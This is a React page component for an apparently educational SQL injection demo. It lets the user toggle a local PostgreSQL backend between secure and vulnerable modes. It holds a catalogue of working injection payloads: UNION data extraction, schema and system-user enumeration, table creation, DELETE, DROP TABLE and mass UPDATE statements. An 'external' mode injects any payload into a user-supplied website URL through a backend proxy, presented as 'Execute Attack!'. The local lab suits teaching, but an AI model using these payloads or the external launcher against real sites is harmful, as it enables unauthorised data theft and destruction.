import React from 'react';
import { useSecurity } from '../contexts/SecurityContext';
import { 
  Database, 
  Shield, 
  AlertTriangle, 
  Code, 
  Eye,
  Play,
  StopCircle,
  RefreshCw
} from 'lucide-react';

const SQLInjectionDemoPage = () => {
  const { securityMode, executeTestQuery, executeAttackDemo } = useSecurity();
  const [query, setQuery] = React.useState('');
  const [results, setResults] = React.useState(null);
  const [isLoading, setIsLoading] = React.useState(false);
  const [selectedAttack, setSelectedAttack] = React.useState('');
  const [currentMode, setCurrentMode] = React.useState('secure');
  const [isModeChanging, setIsModeChanging] = React.useState(false);
  const [customLink, setCustomLink] = React.useState('');
  const [linkMode, setLinkMode] = React.useState('local'); // 'local' o 'external'

  // Obtener el modo actual al cargar la página
  React.useEffect(() => {
    fetchCurrentMode();
  }, []);

  const fetchCurrentMode = async () => {
    try {
      const response = await fetch('/api/demo/current-mode');
      const data = await response.json();
      if (data.success) {
        setCurrentMode(data.mode);
      }
    } catch (error) {
      console.error('Error getting current mode:', error);
    }
  };

  const toggleMode = async () => {
    setIsModeChanging(true);
    try {
      const response = await fetch('/api/demo/toggle-mode', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
      });
      const data = await response.json();
      if (data.success) {
        setCurrentMode(data.mode);
        setResults(null);
      }
    } catch (error) {
      console.error('Error changing mode:', error);
    } finally {
      setIsModeChanging(false);
    }
  };

  const handleCustomLink = async () => {
    if (!query.trim()) return;
    
    setIsLoading(true);
    try {
      if (linkMode === 'local') {
        // Modo local - ejecutar en tu base de datos
        const response = await fetch(`/api/demo/search?q=${encodeURIComponent(query)}&mode=${currentMode}`);
        const result = await response.json();
        setResults(result);
      } else {
        // Modo externo - hacer petición a página web
        if (!customLink.trim()) {
          setResults({ error: 'U' });
          return;
        }
        
        // Construir la URL completa con el ataque SQL
        const url = new URL(customLink);
        const params = new URLSearchParams(url.search);
        
        // Agregar el SQL query como parámetro
        params.set('id', query); // o 'q', 'query', etc. según la página
        
        const attackUrl = `${url.origin}${url.pathname}?${params.toString()}`;
        
        console.log('Executing attack SQL Injection in:', attackUrl);
        
        // Hacer petición HTTP a la URL externa con el ataque
        const response = await fetch(`/api/demo/external-test?url=${encodeURIComponent(attackUrl)}`);
        const result = await response.json();
        
        if (result.success) {
          setResults({
            success: true,
            mode: 'external',
            searchTerm: query,
            message: 'Attack executed successfully',
            externalData: {
              url: attackUrl,
              originalUrl: customLink,
              sqlQuery: query,
              status: result.status,
              statusText: result.statusText,
              data: result.data,
              size: result.size,
              headers: result.headers
            }
          });
        } else {
          setResults({ error: result.message });
        }
      }
    } catch (error) {
      setResults({ error: 'Error al ejecutar el ataque: ' + error.message });
    } finally {
      setIsLoading(false);
    }
  };

  const copyCustomLink = () => {
    if (customLink.trim()) {
      navigator.clipboard.writeText(customLink);
      // Mostrar toast de confirmación
      alert('Link copied to clipboard');
    }
  };

  const attackExamples = [
    // CATEGORÍA 1: EXFILTRACIÓN DE DATOS Y ESQUEMA
    {
      name: 'UNION Attack - Users',
      description: 'Extract all users from the database using UNION',
      query: "' UNION ALL SELECT 999, username, email, NOW() FROM users --",
      category: 'Data Exfiltration & Schema'
    },
    {
      name: 'Schema Discovery - Tablas',
      description: 'Discover all tables in the database',
      query: "' UNION ALL SELECT 999, table_name, 'N/A', NOW() FROM information_schema.tables WHERE table_schema = 'public' --",
      category: 'Data Exfiltration & Schema'
    },
    {
      name: 'Schema Discovery - Columnas',
      description: 'Discover the structure of the users table',
      query: "' UNION ALL SELECT 999, column_name, data_type, NOW() FROM information_schema.columns WHERE table_name = 'users' --",
      category: 'Data Exfiltration & Schema'
    },
    {
      name: 'User Enumeration - Sistema',
      description: 'List all system users POSTGRESQL',
      query: "UNION ALL SELECT 999, usename, usesysid::text, NOW() FROM pg_user",
      category: 'Data Exfiltration & Schema'
    },

    // CATEGORÍA 2: INFORMACIÓN DE LA BASE DE DATOS
    {
      name: 'System Info - Versión',
      description: 'Obtain database version information POSTGRESQL',
      query: "' UNION ALL SELECT 999, version()::text, current_database()::text, current_user::text --",
      category: 'Database Information'
    },
    {
      name: 'Database Stats',
      description: 'Obtain database statistics',
      query: "' UNION ALL SELECT 999, pg_size_pretty(pg_database_size(current_database())), 'N/A', NOW() --",
      category: 'Database Information'
    },
    {
      name: 'Privilege Check',
      description: 'Verify current user privileges',
      query: "'UNION ALL SELECT 999, has_table_privilege(current_user, 'users', 'SELECT')::text, 'N/A', NOW() --",
      category: 'Database Information'
    },

    // CATEGORÍA 3: INSERCIÓN DE NUEVAS TABLAS/ESQUEMAS
    {
      name: 'Create Table Attack',
      description: 'Try to create a new table in the database',
      query: "'; CREATE TABLE hacked_table (id SERIAL, data TEXT); --",
      category: 'Table/Schema Creation'
    },
    {
      name: 'Insert Data Attack',
      description: 'Try to insert malicious data into the database',
      query: "'; INSERT INTO users (username, email) VALUES ('hacker', 'hacked@evil.com'); --",
      category: 'Table/Schema Creation'
    },

    // CATEGORÍA 4: BLANQUEO/BORRADO DE DATOS
    {
      name: 'Delete Data Attack',
      description: 'Try to delete all data from users table',
      query: "'; DELETE FROM users; --",
      category: 'Data Deletion'
    },
    {
      name: 'Drop Table Attack',
      description: 'Try to completely remove the users table',
      query: "'; DROP TABLE users; --",
      category: 'Data Deletion'
    },
    {
      name: 'Update Attack',
      description: 'Try to modify all user emails',
      query: "'; UPDATE users SET email = 'hacked@evil.com'; --",
      category: 'Data Deletion'
    },

    // CATEGORÍA 5: BÚSQUEDA BÁSICA
    {
      name: 'Simple Search',
      description: 'Simple search that should show users',
      query: 'usuario',
      category: 'Basic Search'
    }
  ];

  const handleExecuteQuery = async () => {
    if (!query.trim()) return;
    
    setIsLoading(true);
    try {
      const response = await fetch(`/api/demo/search?q=${encodeURIComponent(query)}&mode=${currentMode}`);
      const result = await response.json();
      setResults(result);
    } catch (error) {
      setResults({ error: error.message });
    } finally {
      setIsLoading(false);
    }
  };

  const handleAttackDemo = async (attack) => {
    setSelectedAttack(attack.name);
    setIsLoading(true);
    try {
      const response = await fetch(`/api/demo/search?q=${encodeURIComponent(attack.query)}&mode=${currentMode}`);
      const result = await response.json();
      setResults(result);
    } catch (error) {
      setResults({ error: error.message });
    } finally {
      setIsLoading(false);
    }
  };

  const clearResults = () => {
    setResults(null);
    setQuery('');
    setCustomLink('');
    setLinkMode('local');
  };

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            
            <div>
              <h1 className="text-3xl font-bold text-gray-900">
It's time to attack!              </h1>
         
            </div>
          </div>
          
          {/* Security Mode Controls */}
          <div className="flex items-center space-x-4">
            <div className={`inline-flex items-center px-4 py-2 rounded-full text-sm font-medium ${
              currentMode === 'secure' 
                ? 'bg-green-100 text-green-800' 
                : 'bg-yellow-100 text-yellow-800'
            }`}>
              
              Mode: {currentMode === 'secure' ? 'Secure' : 'Vulnerable'}
            </div>
            
            <button
              onClick={toggleMode}
              disabled={isModeChanging}
              className={`btn-primary flex items-center space-x-2 ${
                currentMode === 'secure' 
                  ? 'bg-yellow-600 hover:bg-yellow-700' 
                  : 'bg-green-600 hover:bg-green-700'
              }`}
            >
             
              <span>
                {currentMode === 'secure' 
                  ? 'Change to Vulnerable' 
                  : 'Change to Secure'
                }
              </span>
            </button>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Query Input */}
          <div className="space-y-6">
            {/* Enlace personalizado */}
            <div className="card">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">
              Link
              </h3>
              <div className="space-y-4">
                {/* Botones de modo */}
                <div className="flex space-x-3">
                  <button
                    onClick={() => setLinkMode('local')}
                    className={`flex-1 py-2 px-4 rounded-lg font-medium transition-colors ${
                      linkMode === 'local'
                        ? 'bg-blue-600 text-white'
                        : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                    }`}
                  >
                      Local (My PostgreSQL DATABASE)
                  </button>
                  <button
                    onClick={() => setLinkMode('external')}
                    className={`flex-1 py-2 px-4 rounded-lg font-medium transition-colors ${
                      linkMode === 'external'
                        ? 'bg-green-600 text-white'
                        : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                    }`}
                  >   
                     Website Link 
                  </button>
                </div>
                
                {/* Campo de enlace (solo visible en modo externo) */}
                {linkMode === 'external' && (
                  <div>
                    <label htmlFor="customLink" className="form-label">
                      URL 
                    </label>
                    <input
                      id="customLink"
                      type="url"
                      placeholder="https://ejemplo.com/api/usuarios"
                      className="input-field"
                      value={customLink}
                      onChange={(e) => setCustomLink(e.target.value)}
                    />
                  </div>
                )}
                
                <div>
                  <label htmlFor="sqlQuery" className="form-label">
                    SQL Query (Attack)
                  </label>
                  <textarea
                    id="sqlQuery"
                    placeholder="' UNION SELECT username,email FROM users --"
                    className="input-field h-20 resize-none font-mono text-sm"
                    value={query}
                    onChange={(e) => setQuery(e.target.value)}
                  />
                </div>
                
                <div className="flex space-x-3">
                  <button
                    onClick={handleCustomLink}
                    disabled={isLoading || !query.trim() || (linkMode === 'external' && !customLink.trim())}
                    className="btn-primary flex-1"
                  >
                    {isLoading ? (
                      <>
                        <StopCircle className="w-4 h-4 mr-2 animate-spin" />
                        Executing...
                      </>
                    ) : (
                      <>
                        <Play className="w-4 h-4 mr-2" />
                        Execute Attack!
                      </>
                    )}
                  </button>
                  <button
                    onClick={clearResults}
                    className="btn-secondary"
                  >
                    Clear
                  </button>
                </div>
              </div>
            </div>

            {/* Ejemplos de Ataques Organizados por Categorías */}
            <div className="space-y-6">
              <h3 className="text-lg font-semibold text-gray-900">Examples of SQL Injection Attacks</h3>
              
              {/* CATEGORÍA 1: EXFILTRACIÓN DE DATOS Y ESQUEMA */}
              <div className="space-y-3">
                <h4 className="font-medium text-red-700 bg-red-50 px-3 py-2 rounded-lg border border-red-200">
                  Data Exfiltration & Schema
                </h4>
                <div className="space-y-3 pl-4">
                  {attackExamples
                    .filter(attack => attack.category === 'Data Exfiltration & Schema')
                    .map((attack, index) => (
                      <div key={index} className="bg-white border border-gray-200 rounded-lg p-4">
                        <div className="flex justify-between items-start mb-2">
                          <h5 className="font-medium text-gray-900">{attack.name}</h5>
                          <button
                            onClick={() => setQuery(attack.query)}
                            className="px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700 transition-colors"
                          >
                            Try
                          </button>
                        </div>
                        <p className="text-sm text-gray-600 mb-2">{attack.description}</p>
                        <div className="bg-gray-100 p-2 rounded font-mono text-xs text-gray-800 overflow-x-auto">
                          {attack.query}
                        </div>
                      </div>
                    ))}
                </div>
              </div>
              
              {/* CATEGORÍA 2: INFORMACIÓN DE LA BASE DE DATOS */}
              <div className="space-y-3">
                <h4 className="font-medium text-blue-700 bg-blue-50 px-3 py-2 rounded-lg border border-blue-200">
                  Database Information
                </h4>
                <div className="space-y-3 pl-4">
                  {attackExamples
                    .filter(attack => attack.category === 'Database Information')
                    .map((attack, index) => (
                      <div key={index} className="bg-white border border-gray-200 rounded-lg p-4">
                        <div className="flex justify-between items-start mb-2">
                          <h5 className="font-medium text-gray-900">{attack.name}</h5>
                          <button
                            onClick={() => setQuery(attack.query)}
                            className="px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700 transition-colors"
                          >
                            Try
                          </button>
                        </div>
                        <p className="text-sm text-gray-600 mb-2">{attack.description}</p>
                        <div className="bg-gray-100 p-2 rounded font-mono text-xs text-gray-800 overflow-x-auto">
                          {attack.query}
                        </div>
                      </div>
                    ))}
                </div>
              </div>
              
              {/* CATEGORÍA 3: INSERCIÓN DE NUEVAS TABLAS/ESQUEMAS */}
              <div className="space-y-3">
                <h4 className="font-medium text-purple-700 bg-purple-50 px-3 py-2 rounded-lg border border-purple-200">
                  Table/Schema Creation
                </h4>
                <div className="space-y-3 pl-4">
                  {attackExamples
                    .filter(attack => attack.category === 'Table/Schema Creation')
                    .map((attack, index) => (
                      <div key={index} className="bg-white border border-gray-200 rounded-lg p-4">
                        <div className="flex justify-between items-start mb-2">
                          <h5 className="font-medium text-gray-900">{attack.name}</h5>
                          <button
                            onClick={() => setQuery(attack.query)}
                            className="px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700 transition-colors"
                          >
                            Try
                          </button>
                        </div>
                        <p className="text-sm text-gray-600 mb-2">{attack.description}</p>
                        <div className="bg-gray-100 p-2 rounded font-mono text-xs text-gray-800 overflow-x-auto">
                          {attack.query}
                        </div>
                      </div>
                    ))}
                </div>
              </div>
              
              {/* CATEGORÍA 4: BLANQUEO/BORRADO DE DATOS */}
              <div className="space-y-3">
                <h4 className="font-medium text-yellow-700 bg-yellow-50 px-3 py-2 rounded-lg border border-yellow-200">
                  Data Deletion
                </h4>
                <div className="space-y-3 pl-4">
                  {attackExamples
                    .filter(attack => attack.category === 'Data Deletion')
                    .map((attack, index) => (
                      <div key={index} className="bg-white border border-gray-200 rounded-lg p-4">
                        <div className="flex justify-between items-start mb-2">
                          <h5 className="font-medium text-gray-900">{attack.name}</h5>
                          <button
                            onClick={() => setQuery(attack.query)}
                            className="px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700 transition-colors"
                          >
                            Try
                          </button>
                        </div>
                        <p className="text-sm text-gray-600 mb-2">{attack.description}</p>
                        <div className="bg-gray-100 p-2 rounded font-mono text-xs text-gray-800 overflow-x-auto">
                          {attack.query}
                        </div>
                      </div>
                    ))}
                </div>
              </div>
              
              {/* CATEGORÍA 5: BÚSQUEDA BÁSICA */}
              <div className="space-y-3">
                <h4 className="font-medium text-gray-700 bg-gray-50 px-3 py-2 rounded-lg border border-gray-200">
                  Basic Search
                </h4>
                <div className="space-y-3 pl-4">
                  {attackExamples
                    .filter(attack => attack.category === 'Basic Search')
                    .map((attack, index) => (
                      <div key={index} className="bg-white border border-gray-200 rounded-lg p-4">
                        <div className="flex justify-between items-start mb-2">
                          <h5 className="font-medium text-gray-900">{attack.name}</h5>
                          <button
                            onClick={() => setQuery(attack.query)}
                            className="px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700 transition-colors"
                          >
                            Try
                          </button>
                        </div>
                        <p className="text-sm text-gray-600 mb-2">{attack.description}</p>
                        <div className="bg-gray-100 p-2 rounded font-mono text-xs text-gray-800 overflow-x-auto">
                          {attack.query}
                        </div>
                      </div>
                    ))}
                </div>
              </div>
            </div>
          </div>

          {/* Results */}
          <div className="space-y-6">
            <div className="card">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">
                Results
              </h3>
              {results ? (
                <div className="space-y-4">
                  {results.error ? (
                    <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                      <div className="flex items-center space-x-2">
                        <AlertTriangle className="w-5 h-5 text-red-600" />
                        <span className="font-medium text-red-800">Error</span>
                      </div>
                      <p className="text-red-700 mt-2">{results.error}</p>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      {/* Mostrar mensaje de éxito sin emojis ni advertencias */}
                      {results.success && (
                        <div className="mb-4 p-4 bg-green-50 border border-green-200 rounded-lg">
                          <h4 className="font-medium text-green-800 mb-2">Executed Query</h4>
                          <p className="text-green-700 text-sm">
                            {results.message}
                          </p>
                        </div>
                      )}
                      
                      {/* Mostrar resultados reales de la base de datos */}
                      {results.results && results.results.length > 0 && (
                        <div>
                          <h4 className="font-medium text-gray-900 mb-2">Data Extracted from the Database:</h4>
                          
                          {/* Tabla de resultados adaptativa según el tipo de ataque */}
                          <div className="bg-white border border-gray-200 rounded-lg overflow-hidden">
                            <table className="min-w-full divide-y divide-gray-200">
                              <thead className="bg-gray-50">
                                {results.attackType === 'schema_discovery_tables' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Table Name</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Schema</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                  </tr>
                                ) : results.attackType === 'schema_discovery_columns' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Column Name</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Data Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Nullable</th>
                                  </tr>
                                ) : results.attackType === 'user_enumeration' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">System User</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User ID</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Can Create DB</th>
                                  </tr>
                                ) : results.attackType === 'database_stats' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Database Size</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Database Name</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
                                  </tr>
                                ) : results.attackType === 'privilege_check' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Has SELECT</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Table</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Privilege</th>
                                  </tr>
                                ) : results.attackType === 'system_info' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Version</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Database</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User</th>
                                  </tr>
                                ) : results.attackType === 'data_manipulation' ? (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Attack Type</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Description</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
                                  </tr>
                                ) : (
                                  <tr>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ID</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Email</th>
                                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Creation Date</th>
                                  </tr>
                                )}
                              </thead>
                              <tbody className="bg-white divide-y divide-gray-200">
                                {results.results.map((row, index) => (
                                  <tr key={index} className={index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
                                    {results.attackType === 'schema_discovery_tables' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.tableName}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.schema}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.type}</td>
                                      </>
                                    ) : results.attackType === 'schema_discovery_columns' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.columnName}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.dataType}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.nullable}</td>
                                      </>
                                    ) : results.attackType === 'user_enumeration' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.username}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.userID}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.canCreateDB}</td>
                                      </>
                                    ) : results.attackType === 'database_stats' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.databaseSize}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.databaseName}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.timestamp}</td>
                                      </>
                                    ) : results.attackType === 'privilege_check' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.hasSelect}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.tableName}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.privilege}</td>
                                      </>
                                    ) : results.attackType === 'system_info' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.version}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.database}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.user}</td>
                                      </>
                                    ) : results.attackType === 'data_manipulation' ? (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.attackType}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.description}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">{row.timestamp}</td>
                                      </>
                                    ) : (
                                      <>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">{row.id}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.username}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">{row.email}</td>
                                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                          {row.createdAt ? new Date(row.createdAt).toLocaleString() : 'N/A'}
                                        </td>
                                      </>
                                    )}
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                          
                          <p className="text-sm text-gray-600 mt-3">
                            <strong>Total extracted records:</strong> {results.totalResults}
                          </p>
                        </div>
                      )}
                      
                      {/* Mostrar cuando no hay resultados pero se ejecutó la consulta */}
                      {results.results && results.results.length === 0 && (
                        <div className="p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                          <h4 className="font-medium text-yellow-800 mb-2">Query executed - No Results</h4>
                          <p className="text-yellow-700 text-sm">
                            The query was executed correctly in the database, but no records were found that match: <strong>"{results.searchTerm}"</strong>
                          </p>
                        </div>
                      )}
                      
                      {/* Mostrar información técnica del SQL ejecutado */}
                      {results.executedSQL && (
                        <div className="mt-6">
                          <h4 className="font-medium text-gray-900 mb-3">Technical Information of the Query</h4>
                          
                          {/* SQL ejecutado */}
                          <div className="mb-4 p-4 bg-gray-50 border border-gray-200 rounded-lg">
                            <h5 className="font-medium text-gray-800 mb-2">SQL Executed in the Backend:</h5>
                            <div className="bg-gray-100 p-3 rounded font-mono text-sm text-gray-900 overflow-x-auto">
                              {results.executedSQL}
                            </div>
                          </div>
                          
                          {/* Tipo de ataque o consulta */}
                          {results.attackType && (
                            <div className="mb-4">
                              <h5 className="font-medium text-gray-800 mb-2">Query Type:</h5>
                              <span className={`inline-block px-3 py-2 rounded-full text-sm font-medium ${
                                results.attackType === 'union_attack' ? 'bg-red-100 text-red-800' :
                                results.attackType === 'schema_discovery' ? 'bg-blue-100 text-blue-800' :
                                results.attackType === 'secure_query' ? 'bg-green-100 text-green-800' :
                                'bg-gray-100 text-gray-800'
                              }`}>
                                {results.attackType === 'union_attack' ? ' UNION Attack' :
                                 results.attackType === 'schema_discovery' ? ' Schema Discovery' :
                                 results.attackType === 'secure_query' ? 'Secure Query' :
                                 ' Normal Query'}
                              </span>
                            </div>
                          )}
                          
                          {/* Información de seguridad para modo seguro */}
                         
                        </div>
                      )}
                      
                      {/* Mostrar datos externos */}
                      {results.externalData && (
                        <div>
                          <h4 className="font-medium text-gray-900 mb-2">Attack SQL Injection Executed:</h4>
                          
                          {/* Información del ataque */}
                          <div className="mb-3 p-3 bg-red-50 border border-red-200 rounded-lg">
                            <div className="grid grid-cols-1 gap-2 text-sm">
                              <div>
                                <span className="font-medium text-red-800">Original URL:</span> {results.externalData.originalUrl}
                              </div>
                              <div>
                                <span className="font-medium text-red-800">URL with Attack:</span> {results.externalData.url}
                              </div>
                              <div>
                                <span className="font-medium text-red-800">SQL Query:</span> 
                                <code className="bg-red-100 px-2 py-1 rounded text-xs font-mono">
                                  {results.externalData.sqlQuery}
                                </code>
                              </div>
                            </div>
                          </div>
                          
                          {/* Información de la respuesta */}
                          <div className="mb-3 p-3 bg-blue-50 border border-blue-200 rounded-lg">
                            <div className="grid grid-cols-2 gap-4 text-sm">
                              <div>
                                <span className="font-medium">Status:</span> {results.externalData.status} {results.externalData.statusText}
                              </div>
                              <div>
                                <span className="font-medium">Size:</span> {results.externalData.size} bytes
                              </div>
                              <div>
                                <span className="font-medium">Type:</span> {results.externalData.headers['content-type'] || 'N/A'}
                              </div>
                              <div>
                                <span className="font-medium">Server:</span> {results.externalData.headers['server'] || 'N/A'}
                              </div>
                            </div>
                          </div>
                          
                          {/* Datos de la respuesta */}
                          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 overflow-x-auto">
                            <h5 className="font-medium text-blue-800 mb-2">Response of the Page:</h5>
                            <pre className="text-sm text-blue-900">
                              {typeof results.externalData.data === 'string' 
                                ? results.externalData.data 
                                : JSON.stringify(results.externalData.data, null, 2)
                              }
                            </pre>
                          </div>
                          
                          {/* Headers de la respuesta */}
                          <div className="mt-3">
                            <h5 className="font-medium text-gray-900 mb-2">Response Headers:</h5>
                            <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 overflow-x-auto">
                              <pre className="text-sm text-gray-700">
                                {JSON.stringify(results.externalData.headers, null, 2)}
                              </pre>
                            </div>
                          </div>
                        </div>
                      )}
                      
                      {results.results && results.results.length === 0 && (
                        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                          <p className="text-gray-600 text-center">
                            No results found for this query
                          </p>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              ) : (
                <div className="text-center py-8 text-gray-500">
                  <p>Execute a query to see the results</p>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SQLInjectionDemoPage;
